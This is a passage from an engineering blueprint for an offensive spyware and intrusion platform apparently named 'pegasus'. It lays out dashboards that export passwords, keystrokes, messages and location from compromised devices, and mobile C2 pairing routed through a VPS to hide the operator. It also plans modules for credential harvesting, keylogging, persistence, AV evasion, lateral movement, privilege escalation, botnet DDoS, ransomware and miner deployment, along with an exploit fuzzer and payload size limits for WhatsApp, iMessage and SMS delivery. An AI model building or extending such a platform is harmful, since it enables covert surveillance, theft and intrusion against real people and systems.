Paginated (25, max 100), filterable, returns per-module `{runnable, missing_caps}` so the UI never guesses. `PostExploit.tsx` is a virtualized grid with family sidebar, filters, saved views, bulk bar, and a run drawer streaming step logs with per-artifact Export.

---

## PART VII — DATA AND DASHBOARDS

## 29. Live device dashboard

`/devices` is the landing page. Metrics per device: connection state, transport, cap count, last pull, artifact count, battery, thermal, storage.

### 29.1 Connection state machine

```
discovered → paired → authorized → transport_open → caps_probed → live
                                    ↘ revoked / lost / quarantined
```

Controls are enabled by `(state, caps)`. A device in `paired` shows file browse but not `keychain`. Each disabled control names its gate inline: `needs authorized`, `needs root`, `needs cap creds.keystore`. This is the "available only based on current access" requirement, and it is one lookup table, not scattered conditionals.

### 29.2 Per-device pages

`/devices/{id}` renders only the families the device's caps can satisfy. An Android phone shows wireless and OTP; a camera shows RTSP and ONVIF; a PLC shows Modbus. The page is generated from caps, so adding a host kind adds no page code.

## 30. Auto-pull and refresh

```python
class PullScheduler:
    BASE, FLOOR, CEIL = 3.0, 3.0, 60.0
    def interval(self, s): return clamp(self.FLOOR, self.ewma.get(s, 1000) * 4 / 1000, self.CEIL)
```

Connect debounce 10 s, one in-flight pull per device, others coalesce. Change detection first (`COUNT`/`MAX(_id)`), delta pull (`WHERE _id > n`), full reconcile every 6 h with tombstones. Passive modules only by default; `keylogger` is opt-in because it holds `/dev/input`.

## 31. Exports

```
GET /api/export/{host}/{artifact}?fmt=csv|json|kml|gpx|zip
```

Every page gets an Export button. Formats per artifact: location → csv/json/kml/gpx; logs, contacts, messages, browser, passwords, keystrokes, timeline → csv/json/txt; media → zip with manifest. Every bundle carries `manifest.json` (rows, run id, per-artifact sha256) and an ed25519 signature, verified before the browser saves.

---

## PART VIII — PLATFORM OPS

## 32. Dependency installer

```bash
python -m pegasus install --check          # report only
python -m pegasus install --apply          # install, idempotent
```

Detects OS, arch, and package manager (winget/choco/scoop; brew; apt/dnf/pacman), bootstraps the manager if absent, installs the preflight table, and records versions in `~/.pegasus/toolchain.json`. Called automatically from setup when a required binary is missing; `--check` first so the operator sees the list.

Never installs silently mid-run. Each entry declares `required` vs `optional`; only `required` blocks startup.

Mobile packaging: APK built and v2-signed in CI, iOS via script marked `needs-macos`. Both emit a signed manifest feeding the deploy pipeline.

## 33. Mobile C2 pairing

Two modes, one protocol.

```yaml
pairing:
  modes: [local, remote]
  local:  { bind: 0.0.0.0, advertise: lan_ip }
  remote: { relay: <vps>, tls: mutual, anonymity: patn }
```

Flow: operator opens Pair on the dashboard → server issues `{endpoint, token, pubkey, ttl=300}` → QR renders → mobile scans → mutual TLS with the pinned pubkey → HKDF derives the session key → device registers as a host. Remote mode routes through a VPS and optionally PATN so the operator IP never reaches the device.

Token is single-use with a 5-minute TTL and binds to the first scanner's key. Pairing shows in the NOC feed.

---

## PART IX — QUANTUM PORT

| Quantum feature | Target | Acceptance |
|---|---|---|
| Tiered exploit engine | `arsenal/state.py` | only `validated` fires; blocks logged with predicate |
| Exploit orchestrator | `orchestrator/appliance.py` | appliance-aware choice, registry march fallback |
| FOXACID, QUANTUM insert, ICMP, DoH, GhostDNS | `c2/*` | loopback integration test each |
| Credential harvest, keylogger, persistence, wipe, kill switch | `post_exploitation/*` | wipe destructive + reversible |
| Lateral SMB/WMI/RDP/SSH + cred reuse | `lateral/*` | bounded attempts, logged |
| 30+ privesc techniques | `privesc/{win,linux,macos}/` | check + exploit + verify triple each |
| Syscall cloaking, reflective load, VM detect, AMSI | `evasion/*` | detection returns confidence |
| Registry/task/service/WMI/cron/launchd | `persistence/*` | install + verify + remove |
| Android exploit, MDM abuse, iOS assessment | `mobile/*` | ADB provisioning end-to-end |
| Parser chains + stagers | `delivery/` | fixture per parser |
| Botnet/DDoS 8 vectors | `botnet/` | sim default, real gated |
| Drone/IoT/vehicle/ICS/router/camera | transports | per-class smoke test |
| Steganography 4 carriers | `stego/` | round-trip byte equality |
| Payload engine 70+ categories | `payload/` | CI coverage report |
| Autonomous overlord | `overlord/` | cycle cap + aggression enforced |
| QBrain | `qbrain/` | no-AI path yields a valid plan |
| Blockchain vault | `vault/anchor.py` | anchor + verify |
| AI supply chain / inventory | `ai/*` | provenance per model and tool |
| Electron + NSIS + updater | `desktop/` | signed build |
| Daemon | `daemon/` | restart + health + breaker |
| **XOR → real AEAD** | `delivery/envelope.py` | wire-uniqueness proof (§7) |

---

## PART X — QUALITY

## 34. Testing

- Contract test per module: signature, envelope, `not_implemented` for T3, cap gating, timeout
- Replay fixtures under six mutators (`selinux_deny`, `truncate`, `oem_path`, `empty`, `slow`, `garbage`)
- Per-transport fault sets (`usb_throttle`, `nonce_reuse`, `pty_hang`, `share_deny`, `crc_error`)
- Emulator ground-truth matrix with seeded datasets — exact row counts asserted
- Golden device farm, one per OEM, weekly, including reboot survival
- Chaos device: throttled USB, airplane toggles, reboot storms; watchdog at `timeout × 1.5`
- Coverage floor 80% on `delivery/`, `post_exploitation/registry.py`, `manifests.py`, `preflight.py`; 70% on the 170

## 35. CI

`lint` (ruff, mypy strict, manifest lint, doc-drift) · `conformance` per transport · `faults` per transport · `modules` · `transcripts` · `audit --check` · `partial_gate --max 0.15` · `envelope-uniqueness` · `medium-matrix` (every exploit/medium pair asserted).

`audit --check` fails on any drift between the derived percentage table and the committed one.

## 36. Audit derivation

```python
def derive():
    for spec in registry.all():
        total += 1
        if spec.tier == 3: declared += 1; continue
        if not any(t.provides >= spec.requires_caps.all for t in conformant): declared += 1; continue
        if not has_fixture(spec.id): declared += 1; continue
        if not conformance.passes(spec.id): unverified += 1; continue
        implemented += 1
```

Three ways to fall to `declared`: no implementation, no satisfiable cap, no fixture. `unverified` is its own bucket. Post-exploitation will read low for weeks — 170 declared against 12 implemented. State that in the README so week one is not mistaken for a regression.

## 37. Risk register additions

| ID | Risk | Detector | Ladder |
|---|---|---|---|
| R-DEL-01 | medium transcodes and mangles the carrier | `probe.roundtrip` | block medium, require document path |
| R-DEL-02 | nonce reuse | `crypto.nonce_collision` | rotate seed, page |
| R-DEL-03 | payload server unreachable from target | `probe.head_from_probe` | rebind, re-advertise, warn |
| R-FP-01 | contradictory fingerprint | `fp.contradiction` | cap confidence, force silent carrier |
| R-FP-02 | stale fingerprint | `fp.age` | re-fingerprint before fire |
| R-FZ-01 | fuzz run never converges | `fuzz.budget_exhausted` | record best signature, demote |
| R-FZ-02 | false "controlled" from an unrelated crash | `fuzz.control_verify` | require 3 reproductions |
| R-DB-01 | database does not start | `store.init_ok` | fix path, delete WAL, single-instance |
| R-PAIR-01 | QR token replay | `pairing.token_reuse` | reject, alert |
| R-PAIR-02 | device paired from unexpected IP | `pairing.ip_mismatch` | hold for confirm |

---

## PART XI — DELIVERY PLAN

## 38. Phases

| Phase | Content | Days |
|---|---|---|
| 0 | Baseline diff, CI skeleton, branch per phase | 2 |
| 1 | SQL fix, misconfiguration set (§1.4), installer, single-instance | 6 |
| 2 | Caps, host, transport/session ABC, broker, conformance | 15 |
| 3 | adb + agent.rpc to conformance, fault sets | 10 |
| 4 | Envelope crypto, wire-uniqueness proof, nonce detector | 5 |
| 5 | Medium registry, codecs, matrix, gate | 12 |
| 6 | Pipeline stages, receipts, size budgets | 7 |
| 7 | Fingerprint sources, confidence, vector selection | 14 |
| 8 | Arsenal state machine, feeds, scaffold, promote gate | 12 |
| 9 | Offset fuzzer, triage, offset tables | 18 |
| 10 | Fuzzer dashboard, coverage grid | 7 |
| 11 | 7 modules, registry, API, PostExploit UI | 12 |
| 12 | Auto-pull, delta, 3 s refresh, exports | 6 |
| 13 | Device dashboard, state machine, control gating | 9 |
| 14 | 170 modules in 7 batches | 90 |
| 15 | Capability page, partial→full set | 14 |
| 16 | Programmes, families, taxonomy | 9 |
| 17 | Infra: PATN, White Services, NOC, abuse, close-circle, roles | 16 |
| 18 | idevice, ssh, smb, wmi, proto transports | 17 |
| 19 | Mobile pairing, local/remote C2, QR | 9 |
| 20 | Quantum port remainder | 32 |
| 21 | Audit derivation, risk wiring, docs | 12 |
| | **Total** | **334** |

At three engineers, ~22 weeks. Phase 14 is 27% of the total and is why the scaffold and tier discipline matter more than any single feature.

## 39. PR sequence, first 20

1 cap taxonomy · 2 host + trust · 3 Transport/Session ABC · 4 fake transport + conformance · 5 broker · 6 store fix + migrations · 7 misconfiguration set · 8 adb transport · 9 fault harness · 10 agent.rpc · 11 envelope + uniqueness test · 12 nonce detector · 13 medium registry · 14 codec interface + document codec · 15 matrix + gate · 16 pipeline stages · 17 receipts · 18 fingerprint signals · 19 confidence + selection · 20 arsenal state machine.

Nothing merges ahead of its predecessor. PR 15 is the first user-visible change.

## 40. Acceptance

| Line | Target | Proof |
|---|---|---|
| Delivery vectors | 13/13 classified, receipt-capable | per-vector test |
| Agents & skills | 8/8 + skills + registry | contract tests |
| Post-exploitation | 182 tiered, ≥130 at T1/T2 | registry + derived audit |
| Infrastructure | paths, service, task, health, NOC | integration tests |
| Web UI | 32 pages + PWA + fallbacks + PostExploit | route census |
| Crypto | real AEAD, 190/200 unique | uniqueness test |
| Medium matrix | every pair asserted | matrix test |
| Fuzzer | ≥3 builds validated per class | offset tables |

## 41. Cut list

1 `miner_deploy`, `proxy_sell`, `ransomware_deploy` · 2 `sdr_probe`, `blackbed`, `knob` · 3 `steam_session`, `mail_client_configs` · 4 desktop packaging · 5 steganography · 6 proto transports beyond snmp/mqtt/rtsp · 7 fuzzer dashboard (keep the fuzzer).

Never cut: conformance, partial contract, envelope proof, medium matrix, evidence signing, audit derivation.

## 42. Definition of shipped

≥130 T1/T2 modules each backed by a satisfiable cap and conformant transport; every delivery pair matrix-asserted; envelope uniqueness green; partial rate under 15% on every promoted family; derived audit committed and matching; evidence signed and verified; runbook exercised; rollback rehearsed; T3 remainder published as a counted list.

---

## Appendix A — Capability taxonomy (30)

Delivery 13 · Agents & Skills 8 · Post-Exploitation 5 · Infrastructure 4. Each row carries `parity`, `proof`, `since`. A capability with no passing proof renders `declared`.

## Appendix B — Media ceilings

sms_mms 300 KB · whatsapp_document 2 GB · whatsapp_image 16 MB · imessage 100 MB · bluetooth 16 MB · nfc 8 KB · qr 2,953 B · email 25 MB.

## Appendix C — ADRs

- **ADR-0001** Sessions come from a broker with leases, not a hard lateral dependency.
- **ADR-0002** Modules declare capabilities, not platforms. `platform` is a hint.
- **ADR-0003** Mediums are compatibility-checked, not remembered. A transcode is a gate, not a footnote.
- **ADR-0004** Offsets are relative to named structures. Absolute offsets do not survive ASLR.
- **ADR-0005** Every crypto claim carries a wire-uniqueness proof or it is XOR with extra words.
- **ADR-0006** A fuzzer must prove control, not just crash. Three reproductions.
- **ADR-0007** `PARTIAL` is a result. Empty is a bug.

## Appendix D — First 10 days

| Day | Work |
|---|---|
| 1 | caps, host, trust enums |
| 2 | Transport/Session ABC, `CapUnavailable` |
| 3 | fake transport, conformance suite |
| 4 | broker: lease, open, revoke, slots |
| 5 | store init fix, migrations, single-instance |
| 6 | misconfiguration set (§1.4 items 1–10) |
| 7 | adb transport |
| 8 | fault harness, adb faults, fix hangs |
| 9 | envelope, uniqueness test |
| 10 | medium registry, document codec, matrix |

Day 10 checkpoint: if `partial_result_total` on the first rewired family exceeds 5%, there is a cap-model error and the remaining 300 days inherit it. Stop and fix.

---

*End of blueprint.*